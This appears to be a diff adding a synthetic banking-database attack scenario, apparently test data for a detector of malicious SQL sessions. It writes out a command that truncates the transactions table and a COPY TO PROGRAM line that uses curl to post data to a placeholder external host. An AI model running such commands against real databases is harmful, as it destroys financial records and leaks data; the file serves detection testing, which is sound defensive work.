@@ -1,0 +1,23 @@
+scenario_id: gen_banking_09_data_tamper_mal_201
+family_id: gen_banking_09_data_tamper_mal_fam201
+domain: banking
+time_of_day: 00:20
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: postgres
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.0
+  events:
+  - step_id: act
+    sql: TRUNCATE TABLE transactions
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://customs-sync.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 10.0.30.44
+      port: 8080
